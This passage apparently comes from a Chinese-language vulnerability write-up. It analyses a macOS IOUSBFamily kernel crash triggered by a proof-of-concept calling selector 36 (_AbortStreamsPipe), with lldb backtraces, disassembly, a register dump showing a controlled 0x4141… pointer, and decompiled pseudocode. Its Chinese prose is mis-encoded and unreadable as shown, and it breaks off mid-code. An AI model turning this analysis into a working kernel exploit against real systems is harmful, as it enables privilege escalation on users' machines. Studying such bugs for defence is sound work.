com.apple.driver.AppleSMBIOS (558EB25D-8E3F-3429-B2DC-ADAE2EF0F7C3)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIButtons (<span class="number">767834</span>A6-B80F-<span class="number">36</span>ED-<span class="number">9</span>C0A-A6179A144279)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleUSBHostMergeProperties (D338A98F-2B8F-3411-BD87-BD00F620A223)</span><br><span class="line">.......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleFileSystemDriver (<span class="number">998</span>B4AF6-<span class="number">388</span>A-<span class="number">304</span>E-<span class="number">9627</span>-EBB1237252F8)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.Intel82574L (92C2095F-4CB1-36CE-ACF9-518F4610AE68)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBXHCI (<span class="number">38</span>F68C79-<span class="number">811</span>D-<span class="number">3</span>AA2-B8D4-<span class="number">0</span>D444FF4DB4B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBXHCIPCI (7AC984CE-8AAA-3B8D-92E3-24BE18DF3DEC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBEHCI (FA569D7A-D439-<span class="number">32</span>EB-<span class="number">9</span>B57-<span class="number">0</span>A5D5227AC12)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBUHCI (55F5C3FB-6419-35F2-B9A3-836F696C3DBC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBUHCIPCI (<span class="number">4</span>C589408-<span class="number">0</span>FA4-<span class="number">35</span>A0-B8BF-A65EEDFB971F)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBEHCIPCI (C2569C25-E38A-3AC0-8502-594A75E63C76)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAHCIPort (<span class="number">20356</span>FAA-<span class="number">8898</span>-<span class="number">36</span>F8-BAAD-<span class="number">8961</span>AFC23E9B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOAHCIBlockStorage (0A852267-0F62-363B-86D7-C2B02972EE48)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOAHCISerialATAPI (D1CA586E-<span class="number">89</span>CA-<span class="number">36</span>BE-A293-CE0BBD19367D)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleXsanScheme (00C3E9DA-99B0-3518-8B4B-38114EE146A8)</span><br><span class="line">......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBHostCompositeDevice (<span class="number">3</span>E1A0840-<span class="number">033</span>C-<span class="number">321</span>B-B5ED-<span class="number">7</span>BEA6996B1E0)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBHub (271D9C2E-FF74-3503-958E-24C554595575)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.IOUSBHostHIDDevice (<span class="number">65</span>F7A241-C50F-<span class="number">3370</span>-<span class="number">9</span>CE8-<span class="number">54566</span>F0130DE)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleSMC (535447F9-30E0-39BA-A2B8-1A027DED5D53)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.vecLib.kext (E62681B7-BE2F-<span class="number">3</span>F89-<span class="number">8065</span>-<span class="number">91</span>C5C2876EBA)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOHDAFamily (3BF83381-C3DA-3EC4-BBE6-F2024D3EACC7)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDAController (AC7816C9-DEF7-<span class="number">310</span>A-B059-<span class="number">5852</span>BF07A843)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothFamily (022A55C7-EF37-3BE7-AC09-0436CDEFCE95)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOBluetoothHostControllerUSBTransport (<span class="number">67</span>B0326E-F86A-<span class="number">3</span>AEF-BE41-<span class="number">99958414</span>F094)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.VMwareGfx (00FD0C5F-0A29-3656-8718-EBF372456B8E)</span><br><span class="line">....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHV (<span class="number">8</span>E08FFC5-<span class="number">4</span>E33-<span class="number">3</span>D66-BB9B-<span class="number">2</span>EC170B650E6)</span><br><span class="line">.....warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothSerialManager (A6A7E1A3-4063-3C42-9984-67E3BB1A0191)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOSurface (<span class="number">5</span>D984125-CEC9-<span class="number">39</span>B6-BA6E-<span class="number">6</span>C6C6004552C)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOUserEthernet (6D2530ED-C0BC-3F64-B2FC-4490CC30BC06)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.pmtelemetry (C3F2C16A-A407-<span class="number">389</span>C-AD2B-B8582742FE5E)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.IOPlatformPluginFamily (EC53D03F-6CD9-383A-8160-33E02C141EAA)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.IOPlatformPluginLegacy (<span class="number">15</span>BBAC18-<span class="number">907</span>A-<span class="number">394</span>F-BA5B-CC40E055BA13)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.ACPI_SMC_PlatformPlugin (04F77CAB-EA07-362C-B7A2-0167D56D55BC)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleSMBusController (<span class="number">04</span>C9295B-<span class="number">23</span>E8-<span class="number">388</span>B-<span class="number">8</span>BB6-<span class="number">07</span>CC377CADD2)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DspFuncLib (F1E07A68-221D-3ED3-A2BA-1735E0582F3F)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDA (<span class="number">344</span>D4A99-D22C-<span class="number">3</span>E43-<span class="number">9699</span>-<span class="number">82</span>C1B7044CE2)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleHDAHardwareConfigDriver (EDCBE684-9F4F-349A-9E17-D1704C26BD84)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleOSXWatchdog (<span class="number">0</span>CE80268-ACDD-<span class="number">3</span>FCC-<span class="number">8370</span>-<span class="number">8</span>A041468F898)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.vmmemctl (C2161D7F-F967-3406-A377-CD7D11EDE95A)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.vmware.kext.vmhgfs (<span class="number">22192699</span>-<span class="number">95</span>BC-<span class="number">3</span>ACC-<span class="number">96</span>B1-<span class="number">023</span>E6C6073AA)</span><br><span class="line">.. done.</span><br><span class="line">Core file <span class="string">'/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a'</span> (x86_64) was loaded.</span><br><span class="line">(lldb) bt</span><br><span class="line">IOUSBFamily was compiled with optimization - stepping may behave oddly; variables may not be available.</span><br><span class="line">* thread <span class="comment">#1: tid = 0x0000, 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181, stop reason = signal SIGSTOP</span></span><br><span class="line">  * frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">    frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">    frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">    frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">    frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">    frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">    frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">    frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">    frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">    frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ç³»ç»Ÿå´©æºƒæ—¶çš„è°ƒç”¨æ ˆäº†ã€‚è¿™ä¸ªæ ˆå°±æ˜¯POCç¨‹åºåœ¨è™šæ‹Ÿæœºä¸­æ‰§è¡Œåè¿”å›çš„ç»“æœã€‚</p>
<h1 id="0x02_POCå´©æºƒç°åœºåˆ†æ">0x02 POCå´©æºƒç°åœºåˆ†æ</h1><p>é€šè¿‡å¯¹POCæ‰§è¡Œåå´©æºƒçš„ç°åœºï¼Œå¯ä»¥å¾—çŸ¥å…·ä½“çš„å´©æºƒåŸå› ï¼Œå·²ç»å‡½æ•°çš„è°ƒç”¨é¡ºåºï¼Œè¿™æ ·åœ¨åšåŠ¨æ€åˆ†æå’Œé™æ€åˆ†æçš„æ—¶å€™æ‰èƒ½æœ‰çš„æ”¾çŸ¢ã€‚</p>
<h2 id="2-1_è°ƒç”¨æ ˆåˆ†æ">2.1 è°ƒç”¨æ ˆåˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">  frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">  frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">  frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">  frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">  frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">  frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">  frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">  frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">  frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br></pre></td></tr></table></figure>
<p>ç»“åˆ<code>frame #3</code>çš„ä¿¡æ¯ï¼Œä»¥åŠpocä¸­çš„ç›¸å…³ä»£ç æ®µ<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">  err = IOConnectCallMethod(</span><br><span class="line">   conn,</span><br><span class="line">   <span class="number">36</span>,</span><br><span class="line">   inputScalar,</span><br><span class="line">   inputScalarCnt,</span><br><span class="line">   inputStruct,</span><br><span class="line">   inputStructCnt,</span><br><span class="line">   outputScalar,</span><br><span class="line">   &amp;outputScalarCnt,</span><br><span class="line">   outputStruct,</span><br><span class="line">   &amp;outputStructCnt); </span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>æ˜¯åœ¨åº”ç”¨å±‚ç¨‹åºè°ƒç”¨IOUSBFamilyçš„36å·æ–¹æ³•ï¼Œ<code>_AbortStreamsPipe</code>æ—¶è§¦å‘çš„æ¼æ´ã€‚</li>
<li><code>_AbortStreamsPipe</code>åˆè°ƒç”¨äº†<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>å‡½æ•°ã€‚</li>
<li><code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>å‡½æ•°æœ€åè°ƒç”¨äº†<code>AppleUSBPipe::Abort</code>å¹¶è§¦å‘äº†å‡½æ•°çš„å´©æºƒã€‚</li>
</ul>
<h2 id="2-2_å´©æºƒåŸå› ">2.2 å´©æºƒåŸå› </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  	<span class="number">0</span>xffffff7f91b1155f &lt;+<span class="number">119</span>&gt;: callq  <span class="number">0</span>xffffff80112ecc50        ; kprintf at pe_kprintf.c:<span class="number">105</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11564 &lt;+<span class="number">124</span>&gt;: testl  %r14d, %r14d</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11567 &lt;+<span class="number">127</span>&gt;: je     <span class="number">0</span>xffffff7f91b115a8        ; &lt;+<span class="number">192</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11569 &lt;+<span class="number">129</span>&gt;: movl   %r14d, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1156c &lt;+<span class="number">132</span>&gt;: movq   <span class="number">0</span>x88(%rbx), %rcx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11573 &lt;+<span class="number">139</span>&gt;: movq   (%rcx,%rax,<span class="number">8</span>), %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11577 &lt;+<span class="number">143</span>&gt;: movl   <span class="variable">$0xe00002f0</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157c &lt;+<span class="number">148</span>&gt;: testq  %rdi, %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157f &lt;+<span class="number">151</span>&gt;: je     <span class="number">0</span>xffffff7f91b115c9        ; &lt;+<span class="number">225</span>&gt; at AppleUSBPipe.cpp:<span class="number">1187</span></span><br><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11584 &lt;+<span class="number">156</span>&gt;: xorl   %esi, %esi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11586 &lt;+<span class="number">158</span>&gt;: movl   <span class="variable">$0xe00002eb</span>, %edx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158b &lt;+<span class="number">163</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158d &lt;+<span class="number">165</span>&gt;: callq  *<span class="number">0</span>x178(%rax)</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11593 &lt;+<span class="number">171</span>&gt;: cmpl   <span class="variable">$0xe00002d6</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11598 &lt;+<span class="number">176</span>&gt;: je     <span class="number">0</span>xffffff7f91b115b6        ; &lt;+<span class="number">206</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159a &lt;+<span class="number">178</span>&gt;: cmpl   <span class="variable">$0xe0005001</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159f &lt;+<span class="number">183</span>&gt;: jne    <span class="number">0</span>xffffff7f91b115bd        ; &lt;+<span class="number">213</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b115a1 &lt;+<span class="number">185</span>&gt;: movl   <span class="variable">$0xe000405d</span>, %eax</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure>
<p>å´©æºƒçš„æŒ‡ä»¤æ˜¯<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br></pre></td></tr></table></figure>
<p>å¯¹AT&amp;Tæ ¼å¼æ±‡ç¼–ä¸ç†Ÿæ‚‰çš„å¯ä»¥çœ‹ç¬¬äºŒè¡Œçš„æ±‡ç¼–ä»£ç ï¼Œä»–ä»¬æ˜¯ä¸€æ ·çš„ã€‚<br><code>$rdi</code>çš„å€¼ä¸º<code>0x4141414141414141</code>,è€Œè¯¥æŒ‡ä»¤è¯•å›¾è¯»å–åœ°å€ä¸º<code>0x4141414141414141</code>å‡ºçš„å€¼å¹¶å¤åˆ¶ç»™<code>$rax</code>ï¼Œæ‰€ä»¥å°±å´©æºƒäº†ã€‚</p>
<h1 id="0x03_IOUSBFamilyä»£ç åˆ†æ">0x03 IOUSBFamilyä»£ç åˆ†æ</h1><p>é€šè¿‡ç»“åˆåŠ¨æ€åˆ†æä¸é™æ€åˆ†æï¼Œç»™å‡ºåˆ†æåçš„ä¼ªä»£ç ã€‚åˆ†æè¿‡ç¨‹ç•¥è¿‡,éƒ½æ˜¯ä½“åŠ›æ´»ã€‚</p>
<h2 id="3-1_IOUSBInterfaceUserClient::_AbortStreamsPipe">3.1 IOUSBInterfaceUserClient::_AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall IOUSBInterfaceUserClient::_AbortStreamsPipe(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 _a3; <span class="comment">// r14@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er15@2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er12@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl@5</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+10h] [bp-40h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  _a3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">436</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    clock_get_system_microtime(&amp;v13, &amp;v12);</span><br><span class="line">    v4 = *(_DWORD *)(a1 + <span class="number">436</span>);</span><br><span class="line">    v11 = v13;</span><br><span class="line">    v5 = v12;</span><br><span class="line">    LODWORD(v6) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">904L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    v7 = v6;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">952L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &amp; <span class="number">0x10000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = (*(<span class="keyword">int</span> (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">2488L</span>L))(a1, a2);</span><br><span class="line">  result = -<span class="number">536870174</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )                                     <span class="comment">// this-&gt;AbortStreamsPipe(this,0x00000000,0xf0f0f0f0)</span></span><br><span class="line">    result = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)a1</span><br><span class="line">                                                            + <span class="number">0xB58</span>LL))(<span class="comment">// call abortstreamspipe </span></span><br><span class="line">                                                <span class="comment">// get function from this+0xb58</span></span><br><span class="line">               a1,                              <span class="comment">// this</span></span><br><span class="line">               **(_BYTE **)(_a3 + <span class="number">0x20</span>),        <span class="comment">// (lldb) x $rcx</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ab0: 00 00 00 00 00 00 00 00 f0 f0 f0 f0 00 00 00 00  ........????....</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">               *(_DWORD *)(*(_QWORD *)(_a3 + <span class="number">0x20</span>) + <span class="number">8L</span>L));<span class="comment">// (lldb) x $rcx+0x8</span></span><br><span class="line">                                                <span 